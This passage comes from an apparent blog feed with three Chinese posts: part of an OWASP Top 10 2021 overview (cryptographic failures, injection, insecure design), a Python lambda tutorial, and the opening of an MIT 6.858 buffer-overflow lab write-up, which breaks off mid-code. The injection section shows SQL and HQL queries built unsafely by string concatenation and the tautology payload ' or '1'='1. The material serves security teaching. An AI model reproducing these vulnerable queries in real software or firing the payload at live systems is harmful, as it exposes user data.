href="https://cwe.mitre.org/data/definitions/327.html">CWE-327：使用损坏或有风险的加密算法</a>：使用损坏或有风险的加密算法是危险的，可能导致敏感信息的暴露。</li><li><a href="https://cwe.mitre.org/data/definitions/331.html">CWE-331： 熵不足</a>：软件使用的算法或方案产生的熵不足，留下比其他算法或更可能发生的模式或值簇。（某些值产生的随机性太差容易被猜测）</li></ul><h3 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h3><p>确定资料的传输防护需求，举例来说，密码、银行卡号、健康记录、个人资产以及商业秘密等被隐私保护法保护的信息，对于这些资料需要考虑以下问题：</p><ul><li>是否以明文形式传输任何数据？需要关注的协议包括HTTP、SMTP、FTP等未加密协议。外部互联网流量是危险的。 验证所有内部流量，例如负载平衡器、Web 服务器或后端系统之间的流量。</li><li>是否有任何过时的或脆弱的加密演算法被预设使用或存在于较旧的程序代码?</li><li>是否正在使用默认的加密密钥、是否生成了弱加密密钥并重复使用，是否有适当的密钥管理或轮换?加密密钥是否被写入源代码中？</li><li>是否强制执行加密？</li><li>收到的服务器证书和信任链是否正确验证？</li></ul><h3 id="预防方法-1"><a href="#预防方法-1" class="headerlink" title="预防方法"></a>预防方法</h3><ul><li>对应用程序处理存储传输的数据进行分类，根据隐私法、法令法规或商业需求辨认哪些为敏感资料，并按照分类结果执行对应的控制措施。</li><li>非必要不存储敏感性资料，不存储的数据是不会被窃取的。</li><li>确保静态敏感性资料加密（比如数据库里存储的敏感数据</li><li>确认使用最新版且标准的强算法、协定及密钥；适当的使用密钥管理（比如采用KMS（Key Management Service）？</li><li>使用安全协议加密传输中的所有数据，例如具有前向保密 (FS) 密码的 TLS、服务器的密码和安全参数优先。 使用 HTTP 严格传输安全 (HSTS) 等指令强制加密。（HSTS 是 HTTP 严格传输安全（HTTP Strict Transport Security） 的缩写。 这是一种网站用来声明他们只能使用安全连接（HTTPS）访问的方法。 如果一个网站声明了 HSTS 策略，浏览器必须拒绝所有的 HTTP 连接并阻止用户接受不安全的 SSL 证书。 目前大多数主流浏览器都支持 HSTS）</li><li>包含敏感数据的响应应当禁止缓存。</li><li>使用具有散列&#x2F;延迟因素(work factor&#x2F;delay factor)，如 Argon2, scrypt, bcrypt 或 PBKDF2 的强自适应加盐散列函数来存储密码。</li><li>独立验证配置和设置的有效性。</li></ul><h3 id="攻击情景实例-1"><a href="#攻击情景实例-1" class="headerlink" title="攻击情景实例"></a>攻击情景实例</h3><p><strong>情境 #1</strong>: 有一个应用程序使用自动化资料库加密来加密资料库中的信用卡卡号，但是资料被检索时是被自动解密的，进而允许通过 SQL 注入缺陷来检索信用卡卡号明文。</p><p><strong>情境 #2</strong>: 有一个平台没有对所有页面强制使用 TLS ，攻击者监控网络流量(如在不安全的无线网络), 将连线从 HTTPS 降级成 HTTP，并拦截请求窃取使用者的会话(session) cookies，之后攻击者重送窃取到的会话(session) cookies 并劫持用户(认证过的)的会话，进而检索或修改使用者的隐私资料。 除了上述以外，攻击者也能修改传输的数据，如汇款收款人。</p><p><strong>情境 #3</strong>: 密码资料库使用未加盐或简单的散列函数来储存每个人的密码，一个档案上传的缺陷可以让攻击者存取密码资料库，所有未被加盐的哈希可以被预先计算好的彩虹表解密。即使加盐，由简单或快速的哈希仍能被 GPU 破解。</p><h2 id="A03-注入式攻击"><a href="#A03-注入式攻击" class="headerlink" title="A03 注入式攻击"></a>A03 注入式攻击</h2><h3 id="简述-2"><a href="#简述-2" class="headerlink" title="简述"></a>简述</h3><p>注入式攻击下滑到了第三名，94%的被测应用程序都有检测到某种类型的注入式攻击问题。著名的CWE包括：</p><ul><li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79：网页生成期间输入的不当中和（“跨站点脚本”）)</a>：应用不会抵消或错误的抵消用户可控的输入，然后将其放入输出中，该输出用作提供给其他用户的网页。</li><li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89：SQL 命令中使用的特殊元素的不当中和（“SQL 注入”）</a>：如果不在用户可控制的输入中充分删除或引用 SQL 语法，生成的 SQL 查询可能会导致这些输入被解释为 SQL 而不是普通用户数据。这可用于更改查询逻辑以绕过安全检查，或插入修改后端数据库的其他语句，可能包括执行系统命令。</li><li><a href="https://cwe.mitre.org/data/definitions/73.html">CWE-73：文件名或路径的外部控制</a>：软件允许用户输入来控制或影响文件系统操作中使用的路径或文件名。</li></ul><h3 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h3><p>应用程序在以下情况下容易遭受攻击：</p><ul><li>应用程序未验证、过滤或者清理使用者提供的资料。</li><li>在解释器中未使用上下文感知转义的动态查询或者无参数调用</li><li>在对象关系映射（ORM）的搜索参数中使用恶意的数据来提取额外的敏感数据。</li><li>恶意数据被直接使用或者连接，SQL语句或者命令包含动态查询、命令或存储过程中的结构和恶意数据。</li></ul><p>一些常见的注入式攻击是 SQL、NoSQL、OS 指令、对象关系映射 (ORM)、LDAP 以及表达式语言 (EL) 或对象导航图语言 (OGNL) 注入。这个概念在所有的解释器都是相同的。假若应用程式存在注入式攻击的弱点，源码检测是最好的方式。强烈建议对所有输入的参数、标头、URL、cookies、JSON、SOAP（简单对象访问协议） 以及 XML 的数据进行自动化测试。组织可以将静态源码测试 (SAST) 以及动态应用程序检测 (DAST) 工具，包含到持续整合与持续部署 (CI&#x2F;CD)管道中，以达成在上线部署前能识别注入攻击的缺陷。</p><h3 id="预防方法-2"><a href="#预防方法-2" class="headerlink" title="预防方法"></a>预防方法</h3><ul><li>将命令与查询数据分离，防止注入式攻击。</li><li>使用安全的API，避免使用解释器，以提供参数化界面或整合到对象关系映射工具中</li><li>使用白名单在服务器端验证输入的数据。</li><li>对于任何剩余的动态查询，在转译中使用特殊符号进行查询，给查询语法带来不同的含义。注意：表名等无法被转义，因此使用者提供数据结构名称是危险操作</li><li>在查询中使用 LIMIT 以及其它的 SQL 控制器，可以防止当遭受 SQL 注入式攻击时被大量泄露纪录。</li></ul><h3 id="攻击情景实例-2"><a href="#攻击情景实例-2" class="headerlink" title="攻击情景实例"></a>攻击情景实例</h3><p><strong>情境 #1:</strong> 应用程序在脆弱的 SQL 调用中使用了不被信任的数据：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">query</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SELECT * FROM accounts WHERE custID=&#x27;&quot;</span> + request.getParameter(<span class="hljs-string">&quot;id&quot;</span>) + <span class="hljs-string">&quot;&#x27;&quot;</span>;<br></code></pre></td></tr></table></figure><p><strong>情境 #2:</strong> 类似地，应用程序对框架的盲目信任，可能导致仍然在漏洞的查询，(例如：Hibernate 查询语言 (HQL))：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Query</span> <span class="hljs-variable">HQLQuery</span> <span class="hljs-operator">=</span> session.createQuery(<span class="hljs-string">&quot;FROM accounts WHERE custID=&#x27;&quot;</span> + request.getParameter(<span class="hljs-string">&quot;id&quot;</span>) + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br></code></pre></td></tr></table></figure><p>在这两个情境中，攻击者在他们的浏览器修改了 “id” 参数值，送出 ‘ or ‘1’&#x3D;’1，例如：</p><p><a href="http://example.com/app/accountView?id=&#39;">http://example.com/app/accountView?id=&#39;</a> or ‘1’&#x3D;’1</p><p>这两个查询的含义将产生改变，而响应所有帐户数据表中的记录，更危险的攻击将可能修改或删除数据。</p><h2 id="A04-不安全的设计"><a href="#A04-不安全的设计" class="headerlink" title="A04 不安全的设计"></a>A04 不安全的设计</h2><h3 id="简述-3"><a href="#简述-3" class="headerlink" title="简述"></a>简述</h3><p>2021年中全新的一个类别，着重于在设计和架构中的风险。呼吁使用更多的威胁建模、安全设计模式与参考架构。著名的CWE包括：</p><ul><li><a href="https://cwe.mitre.org/data/definitions/209.html">CWE-209：生成包含敏感信息的错误消息</a>：软件会生成一条错误消息，其中包含有关其环境、用户或关联数据的敏感信息。</li><li><a href="https://cwe.mitre.org/data/definitions/256.html">CWE-256：密码的纯文本存储</a>：当密码以纯文本形式存储在应用程序的属性、配置文件或内存中时，会出现密码管理问题。通过在配置文件中存储纯文本密码，可以读取该文件的任何人都可以访问受密码保护的资源。在某些情况下，如果在使用密码后未立即清除密码，则即使在内存中存储纯文本密码也被视为安全风险。</li><li><a href="https://cwe.mitre.org/data/definitions/501.html">CWE-501： 信任边界违规</a>：可以将信任边界视为通过程序绘制的线。在这条线的一侧，数据是不可信的。在线路的另一端，假定数据是可信的。验证逻辑的目的是允许数据安全地跨越信任边界 - 从不受信任的移动到受信任的。当程序模糊了受信任内容和不受信任的内容之间的界限时，就会发生信任边界冲突。通过将可信和不受信任的数据合并到同一数据结构中，程序员更容易错误地信任未经验证的数据。</li><li><a href="https://cwe.mitre.org/data/definitions/522.html">CWE-522：凭据保护不足</a>：产品传输或存储身份验证凭据，但它使用不安全的方法，该方法容易受到未经授权的拦截和&#x2F;或检索。</li></ul><h3 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h3><p>不安全的设计是一个广泛的类别呈现许多不同的弱点，代表为“缺乏或无效的控制设计”。不安全的设计并不是所有其他10大类风险类别的根源，不安全的设计和不安全的实现是有区别的。我们去区分设计缺陷和实现缺陷是有原因的，他们有不同的根本原因和补救措施。安全设计可能仍然会存在实现上的缺陷，导致可能被利用的漏洞，但是一个不安全的设计不可能通过一个完美的实现来修复，因为根据定义，所需要的安全控制从来没有创建用于防御特定的攻击。导致不安全的设计的因素之一是缺乏对正在开发的软甲或者系统中固有的业务风险分析，因此无法确定需要什么级别的安全设计。</p><h4 id="需求和资源管理"><a href="#需求和资源管理" class="headerlink" title="需求和资源管理"></a>需求和资源管理</h4><p>收集应用程序的业务要求并与业务部门协商，包括有关所有数据资产的机密性、完整性、可用性和真实性，以及预期业务逻辑的保护要求。考虑应用程序的公开程度以及是否需要隔离（除了访问控制之外）。编写技术要求，包括功能性和非功能性的安全要求。</p><h4 id="安全设计"><a href="#安全设计" class="headerlink" title="安全设计"></a>安全设计</h4><p>安全设计是一种文化和方法，它不断评估威胁，并确保代码经过稳健的设计和测试，防止已知的攻击方法。威胁建模纳入细化的会议，查找数据流和访问控制或者其他安全组件中的更改。安全设计既不是附加组件，也不是可以添加到软件中的工具。</p><h4 id="安全的开发的生命周期"><a href="#安全的开发的生命周期" class="headerlink" title="安全的开发的生命周期"></a>安全的开发的生命周期</h4><p>安全软件需要安全的开发生命周期、某种形式的安全设计模式、铺砌的道路方法、安全的组件库、工具和威胁建模。</p><h3 id="预防方法-3"><a href="#预防方法-3" class="headerlink" title="预防方法"></a>预防方法</h3><ul><li>与应用安全专业人员一起建立和使用安全的开发生命周期，以帮助评估和设计与安全和隐私相关的控制措施</li><li>建立和使用安全设计模式库或者已经铺设道路的即用型组件</li><li>将威胁模型用于关键身份认证、访问控制、业务逻辑和密钥流</li><li>将安全语言和控件集成到用户情景中</li><li>在应用程序的每一层集成合理性检查</li><li>编写单元和集成测试以验证所有关键流是否都能抵御威胁模型，为应用程序的每一层编写用例和误用案例</li><li>根据暴露和保护需求，在系统层和网络层上设置隔离层</li><li>通过设计在所有层中强有力的隔离租户</li><li>按用户或服务限制资源消耗</li></ul><h3 id="攻击情景实例-3"><a href="#攻击情景实例-3" class="headerlink" title="攻击情景实例"></a>攻击情景实例</h3><p><strong>场景 #1：</strong>凭据恢复工作流可能包括 NIST 800-63b、OWASP ASVS 和 OWASP 前 10 名所禁止的“问题和答案”。问题和答案不能被信任为身份的证据，由于不止一个人可以知道答案，因此它们被禁止。应该删除此类代码，并将其替换为更安全的设计。</p><p><strong>场景 #2：</strong> 电影院在要求押金前允许团体预订折扣并且最多有 15 名观众。攻击者可以威胁模型此流程并测试他们在一次请求中是否可以预订 600 个座位和的所有电影院，导致电影院巨大的收入损失。</p><p><strong>场景 #3：</strong>零售连锁店的电子商务网站没有针对黄牛购买高端显卡转售拍卖网站所运行的机器人的保护，这将造成正常的购买者无法买到显卡。仔细的反机器人设计和域逻辑规则（例如在可用后几秒钟内进行的购买）可能会识别不真实的购买并拒绝此类交易。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python lambda匿名函数妙用</title>
    <link href="/blog/2022/06/29/Python-lambda%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0%E5%A6%99%E7%94%A8/"/>
    <url>/blog/2022/06/29/Python-lambda%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0%E5%A6%99%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>最近一直在坚持leetcode每日一题，遇到了一种很有意思且方便的lambda匿名函数，记录一下备忘~</strong></p><p><img src="/images/fj58.jpg"></p><span id="more"></span><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>lambda函数的语法非常简单，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">lambda</span> [arg1 [,arg2,.....argn]]:expression<br></code></pre></td></tr></table></figure><p>举个栗子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">f = <span class="hljs-keyword">lambda</span> x,y:x+y<br>f(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<span class="hljs-comment">#结果就是1+2=3</span><br><br><span class="hljs-comment">#上述lambda表达式等价于下面的函数</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func_</span>(<span class="hljs-params">x,y</span>):<br>    <span class="hljs-keyword">return</span> x+y<br>func_(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>语法非常简单，但是可以和其他常用函数组合起来实现很多效果。</p><h2 id="将lambda函数作为参数传递给其他函数"><a href="#将lambda函数作为参数传递给其他函数" class="headerlink" title="将lambda函数作为参数传递给其他函数"></a>将lambda函数作为参数传递给其他函数</h2><h3 id="1-与map函数结合"><a href="#1-与map函数结合" class="headerlink" title="1.与map函数结合"></a>1.与map函数结合</h3><p><strong>map()</strong> 会根据提供的函数对指定序列做映射。</p><p>第一个参数 function 以参数序列中的每一个元素调用 function 函数，返回包含每次 function 函数返回值的新列表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">map</span>(function, iterable, ...)<br></code></pre></td></tr></table></figure><p>此时lambda函数用于指定对列表中每一个元素的共同操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 求两个列表元素的和</span><br><br><span class="hljs-meta">&gt;&gt;&gt; </span>a = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>b = [<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x, y: x+y, a, b))<br>[<span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">10</span>, <span class="hljs-number">12</span>]<br><br></code></pre></td></tr></table></figure><h3 id="2-与filter函数结合"><a href="#2-与filter函数结合" class="headerlink" title="2.与filter函数结合"></a>2.与filter函数结合</h3><p><strong>filter()</strong> 函数用于过滤序列，过滤掉不符合条件的元素，返回由符合条件元素组成的新列表。</p><p>该接收两个参数，第一个为函数，第二个为序列，序列的每个元素作为参数传递给函数进行判断，然后返回 True 或 False，最后将返回 True 的元素放到新列表中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">filter</span>(function, iterable)<br></code></pre></td></tr></table></figure><p>此时lambda函数用于指定过滤列表元素的条件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 筛选偶数</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">list</span>(<span class="hljs-built_in">filter</span>(<span class="hljs-keyword">lambda</span> x: x%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>,  [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]))<br>[<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>]<br><br><span class="hljs-comment"># 等价于下面的列表推导式</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>l = [x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>] <span class="hljs-keyword">if</span> x%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>l<br>[<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>]<br><br></code></pre></td></tr></table></figure><h3 id="3-与sorted函数结合"><a href="#3-与sorted函数结合" class="headerlink" title="3.与sorted函数结合"></a>3.与sorted函数结合</h3><p><strong>sorted()</strong> 函数对所有可迭代的对象进行排序操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">sorted</span>(iterable, cmp=<span class="hljs-literal">None</span>, key=<span class="hljs-literal">None</span>, reverse=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p><strong>sort 与 sorted 区别：</strong></p><p>sort 是应用在 list 上的方法，sorted 可以对所有可迭代的对象进行排序操作。</p><p>list 的 sort 方法返回的是对已经存在的列表进行操作，无返回值，而内建函数 sorted 方法返回的是一个新的 list，而不是在原来的基础上进行的操作。</p><p>此时lambda函数用于指定对列表中所有元素进行排序的准则：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>info = [(<span class="hljs-string">&#x27;James&#x27;</span>,<span class="hljs-number">32</span>), (<span class="hljs-string">&#x27;Alies&#x27;</span>,<span class="hljs-number">20</span>), (<span class="hljs-string">&#x27;Wendy&#x27;</span>,<span class="hljs-number">25</span>)]<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">sorted</span>(info, key=<span class="hljs-keyword">lambda</span> age:age[<span class="hljs-number">1</span>])  <span class="hljs-comment"># 按照第二个元素，索引为1排序</span><br>[(<span class="hljs-string">&#x27;Alies&#x27;</span>, <span class="hljs-number">20</span>), (<span class="hljs-string">&#x27;Wendy&#x27;</span>, <span class="hljs-number">25</span>), (<span class="hljs-string">&#x27;James&#x27;</span>, <span class="hljs-number">32</span>)]<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">sorted</span>(info, key=<span class="hljs-keyword">lambda</span> age:-age[<span class="hljs-number">1</span>])<span class="hljs-comment"># 按照第二个元素，索引为1排序降序</span><br>[(<span class="hljs-string">&#x27;James&#x27;</span>, <span class="hljs-number">32</span>), (<span class="hljs-string">&#x27;Wendy&#x27;</span>, <span class="hljs-number">25</span>), (<span class="hljs-string">&#x27;Alies&#x27;</span>, <span class="hljs-number">20</span>)]<br></code></pre></td></tr></table></figure><h3 id="4-与reduce函数结合"><a href="#4-与reduce函数结合" class="headerlink" title="4.与reduce函数结合"></a>4.与reduce函数结合</h3><p><strong>reduce()</strong> 函数会对参数序列中元素进行累积。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">reduce(function, iterable[, initializer])<br></code></pre></td></tr></table></figure><p>此时lambda函数用于指定列表中两两相邻元素的结合条件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;&gt;&gt;<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">x, y</span>) : <span class="hljs-comment"># 两数相加</span><br><span class="hljs-meta">... </span>   <span class="hljs-keyword">return</span> x + y<br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>reduce(add, [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>]) <span class="hljs-comment"># 计算列表和：1+2+3+4+5</span><br><span class="hljs-number">15</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>reduce(<span class="hljs-keyword">lambda</span> x, y: x+y, [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>]) <span class="hljs-comment"># 使用 lambda 匿名函数</span><br><span class="hljs-number">15</span><br><br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>lambda 并不会带来程序运行效率的提高，只会使代码更简洁，可以与一些python内置函数使用，增加灵活性。</p>]]></content>
    
    
    
    <tags>
      
      <tag>leetcode</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MIT6.858-计算机系统安全（一）</title>
    <link href="/blog/2022/06/10/MIT6-858-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/blog/2022/06/10/MIT6-858-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p><strong>很久很久没写博客了，准确来说是变懒了，看到实验室同学都在开始准备工作的事情了，想想自己也该开始谋划基础学习了，之前学过一些简单的软件与系统安全的堆栈溢出，现在想通过MIT的计算机系统安全课程再较为深入学习一下。</strong></p><p><img src="/images/fj57.jpg"></p><span id="more"></span><p>实验一链接地址：<a href="https://css.csail.mit.edu/6.858/2022/labs/lab1.html">6.858 &#x2F; 2022年春季 (mit.edu)</a></p><p>进程地址空间：</p><p><img src="/images/jcdzkj.png"></p><h2 id="一、查找缓冲区溢出"><a href="#一、查找缓冲区溢出" class="headerlink" title="一、查找缓冲区溢出"></a>一、查找缓冲区溢出</h2><h3 id="练习-1"><a href="#练习-1" class="headerlink" title="练习 1"></a>练习 1</h3><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">研究 Web 服务器的 C 代码（在 `zookd.c` 和 `http.c` 中），并找到一个允许攻击者覆盖函数返回地址的代码示例。提示：查找堆栈上分配的缓冲。对于您的漏洞，请描述可能溢出的缓冲区，如何构建Web服务器的输入（即HTTP请求）以溢出缓冲区并覆盖返回地址，以及将触发缓冲区溢出的调用堆栈（即从`process_client`开始的函数调用链）。<br></code></pre></td></tr></table></figure><p>zookd.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">process_client</span><span class="hljs-params">(<span class="hljs-type">int</span>)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">run_server</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *portstr)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">start_server</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *portstr)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>)<br>        errx(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Wrong arguments&quot;</span>);<br><br>    run_server(argv[<span class="hljs-number">1</span>]);<br>&#125;<br><br><span class="hljs-comment">/* socket-bind-listen idiom */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">start_server</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *portstr)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">addrinfo</span> <span class="hljs-title">hints</span> =</span> &#123;<span class="hljs-number">0</span>&#125;, *res;<br>    <span class="hljs-type">int</span> sockfd;<br>    <span class="hljs-type">int</span> e, opt = <span class="hljs-number">1</span>;<br><br>    hints.ai_family = AF_UNSPEC;<br>    hints.ai_socktype = SOCK_STREAM;<br>    hints.ai_flags = AI_PASSIVE;<br><br>    <span class="hljs-keyword">if</span> ((e = getaddrinfo(<span class="hljs-literal">NULL</span>, portstr, &amp;hints, &amp;res)))<br>        errx(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;getaddrinfo: %s&quot;</span>, gai_strerror(e));<br>    <span class="hljs-keyword">if</span> ((sockfd = socket(res-&gt;ai_family, res-&gt;ai_socktype, res-&gt;ai_protocol)) &lt; <span class="hljs-number">0</span>)<br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;socket&quot;</span>);<br>    <span class="hljs-keyword">if</span> (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;opt, <span class="hljs-keyword">sizeof</span>(opt)))<br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;setsockopt&quot;</span>);<br>    <span class="hljs-keyword">if</span> (fcntl(sockfd, F_SETFD, FD_CLOEXEC) &lt; <span class="hljs-number">0</span>)<br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;fcntl&quot;</span>);<br>    <span class="hljs-keyword">if</span> (bind(sockfd, res-&gt;ai_addr, res-&gt;ai_addrlen))<br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;bind&quot;</span>);<br>    <span class="hljs-keyword">if</span> (listen(sockfd, <span class="hljs-number">5</span>))<br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;listen&quot;</span>);<br>    freeaddrinfo(res);<br><br>    